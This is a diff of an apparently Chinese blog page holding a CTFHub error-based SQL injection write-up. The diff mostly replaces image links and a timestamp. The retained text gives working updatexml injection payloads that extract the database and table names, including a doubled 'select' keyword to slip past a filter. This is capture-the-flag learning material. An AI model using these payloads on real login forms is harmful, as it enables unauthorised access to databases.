@@ -249,7 +249,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-03-15 00:35:30 / Modified: 11:23:37" itemprop="dateCreated datePublished" datetime="2022-03-15T00:35:30+08:00">2022-03-15</time>
+              <time title="Created: 2022-03-15 00:35:30 / Modified: 11:42:27" itemprop="dateCreated datePublished" datetime="2022-03-15T00:35:30+08:00">2022-03-15</time>
             </span>
 
           
@@ -267,24 +267,17 @@
 <p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
 <h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
 <p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
-<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314112201847-16473141849705.png" class title="image-20220314112201847.png">
 
-<p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
-<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314112521952-16473142045597.png" class title="image-20220314112521952.png">
 
+<p><img src="https://github.com/UknowJJ/UknowJJ.github.io/blob/master/PicGo/image-20220314112201847.png?raw=true" alt="image-20220314112201847.png">3.order by 4会报错，确定只有三列，这是一个报错注入<br><img src="https://github.com/UknowJJ/UknowJJ.github.io/blob/master/PicGo/image-20220314112201847.png" alt="image"></p>
 <p>4.用updatexml函数进行报错返回值</p>
-<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314115455054-164731423404111.png" class title="image-20220314115455054.png"><img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314112836216-16473142179759.png" class title="image-20220314112836216.png">
+
 
 <p>构建语句发现只返回了一个~</p>
-<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314120622082-164731429015113.png" class title="image-20220314120622082.png">
-
-<p>发现中间这个值才会被返回</p>
-<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314120622082-164731429908415.png" class title="image-20220314120622082.png">
-
-<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
-<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314120731153-164731430788317.png" class title="image-20220314120731153.png">
 
 
+<p>发现中间这个值才会被返回<br><img src="https://github.com/UknowJJ/UknowJJ.github.io/blob/master/PicGo/image-20220314120731153.png" alt="image"></p>
+<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code><br><img src="https://github.com/UknowJJ/UknowJJ.github.io/blob/master/PicGo/image-20220314121349655.png" alt="image"></p>
 <p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
 <p>构造语句</p>
 <p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
